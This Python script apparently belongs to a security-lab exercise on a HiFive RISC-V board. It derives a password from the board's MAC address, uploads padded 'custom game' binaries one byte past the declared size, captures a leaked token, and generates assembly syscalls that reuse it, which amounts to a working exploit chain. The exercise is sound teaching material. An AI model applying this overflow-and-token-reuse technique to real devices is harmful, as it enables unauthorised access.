import copy
import time
import pylink
import serial
import serial.tools.list_ports
import os

BOARD_PORT = ['/dev/ttyACM0', '/dev/ttyACM1']
hifive_serial_no = ''
hifive_ports = []
custom_game = []
##TEMPORARY
token = b''
#TEMPORARY        




print('Waiting for board \n')
while(len(hifive_ports) <= 1):
    time.sleep(1)
    ports = serial.tools.list_ports.comports()
    
    for port in sorted(ports):
        if port.device in BOARD_PORT:
            hifive_serial_no = port.serial_number
            hifive_ports.append(port.device)      

print('Detected board at ports:',hifive_ports, '\nSERIAL_NO:  ', hifive_serial_no)

os.system('echo "Reset" | JLinkExe -device RISC-V -if JTAG -speed 4000 -jtagconf -1-1 -autoconnect 1')

try:
    hifive_port_0 = serial.Serial(port= hifive_ports[0], baudrate= 115200, timeout = 0.11) 
    hifive_port_1= serial.Serial(port= hifive_ports[1], baudrate= 115200, timeout = 0.1)
except:
    print('No board connected')


hifive_port_1.dtr = 0
time.sleep(0.1)
hifive_port_1.rts = 0
time.sleep(0.1)


line = ''

while 'sta_mac' not in line:
    time.sleep(0.1)
    line = hifive_port_1.readline().decode('utf-8')

words = line.split(' ')
mac_addr = words.pop()
mac_addr = mac_addr[:17]
password= f'__SecLab__{mac_addr}'

print("PASSWORD:", password, '\n')
print(hifive_port_0.read_until('SecLab'))

hifive_port_0.write(bytes(password, 'utf-8'))
print(hifive_port_0.read_until('SecLab'))

time.sleep(0.5)
hifive_output = b''




for i in range(2):
    os.system('make clean')
    os.system('make')
    
    filename = f'custom_game{i+1}.bin'
    print('\n\nOPENING', filename, '\n')
    f = open(filename, 'rb')
    custom_game = copy.deepcopy(f.read())
    f.close()    
    
    hifive_port_0.write(bytes('l', 'utf-8'))
    print(hifive_port_0.read_until('SecLab'))

    time.sleep(0.5)

    game_size = 2048
    hifive_port_0.write(game_size.to_bytes(4, byteorder='big'))
    print(hifive_port_0.read_until('SecLab'))

    print('\n CUSTOM GAME:\t', custom_game)
    for j in range(2049 - len(custom_game)):
        custom_game = custom_game + b'A'
    print('custom_game + PADDING LENGTH       ', len(custom_game),'\n')

    hifive_port_0.write(custom_game)

    

    hifive_output= hifive_port_0.read_until('SecLab')
    print(hifive_output)

    ### UGLY APPROACH
    if i == 0:
        token = hifive_output[42:46]
        print('TOKEN:   ', token)
        token = token[::-1]
        print('TOKEN:   ', token)

        if token != b'':
            filename = f'custom_game2.s'
            file = open(filename, 'w')
            syscall_7_1 = '\taddi    a0, x0, 0x7\n\tli      a1, 0x'
            syscall_7_2 ='\n\taddi    a2, x0, 0\n\tecall\n\t'
            syscall_6 = 'addi    a0, x0, 0x6\n\tli      a1, 0x80003900\n\taddi    a2, x0, 0\n\tecall\n\t'
            syscall_exit= 'addi    a0, x0, 1\n\tli      a1, 0\n\taddi    a2, x0, 0\n\tecall\n\t'
            syscall_2 = '\n\taddi    a0, x0, 0x2\n\tla      a1, 0x80003900\n\taddi    a2, x0, 0\n\tecall\n\t'       

            #addi    a2, x0, 0\n\t
            print('TOKEN:', token.hex())
            file.write(syscall_7_1+token.hex()+syscall_7_2+syscall_6+syscall_2+syscall_exit)
            file.close()
    ### END UGLY APPROACH
    
    


# EPILOGUE
hifive_port_0.close()
hifive_port_1.close()


